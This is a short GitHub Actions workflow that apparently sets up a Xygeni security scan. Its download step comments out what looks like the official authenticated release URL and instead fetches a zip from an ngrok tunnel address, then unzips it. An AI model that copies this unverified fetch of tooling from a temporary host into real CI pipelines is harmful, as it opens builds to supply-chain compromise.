on:
  workflow_dispatch:
  push:
    branches: [main, develop]
  pull_request:
    branches: [main, develop]

permissions:
  actions: read
  contents: read
  security-events: write

jobs:
  xygeni-scan:
    runs-on: ubuntu-latest
    name: xygeni-github-action
    steps:
      # Checkout repo (into GITHUB_WORKSPACE)
      - name: Checkout
        uses: actions/checkout@v3.1.0
        with:
          fetch-depth: 0

      - name: Download
        shell: bash
        run: |
          # curl -s -o ${{ runner.temp }}/xygeni_scanner.zip -H "Authorization: Bearer ${{ secrets.XYGENI_TOKEN }}" -L ${{ vars.XYGENI_URL }}/scan/releases
          curl -s -o ${{ runner.temp }}/xygeni_scanner.zip -L https://92f0-46-24-156-184.ngrok-free.app/xygeni-release.zip
          cd ${{ runner.temp }}
          unzip ${{ runner.temp }}/xygeni_scanner.zip
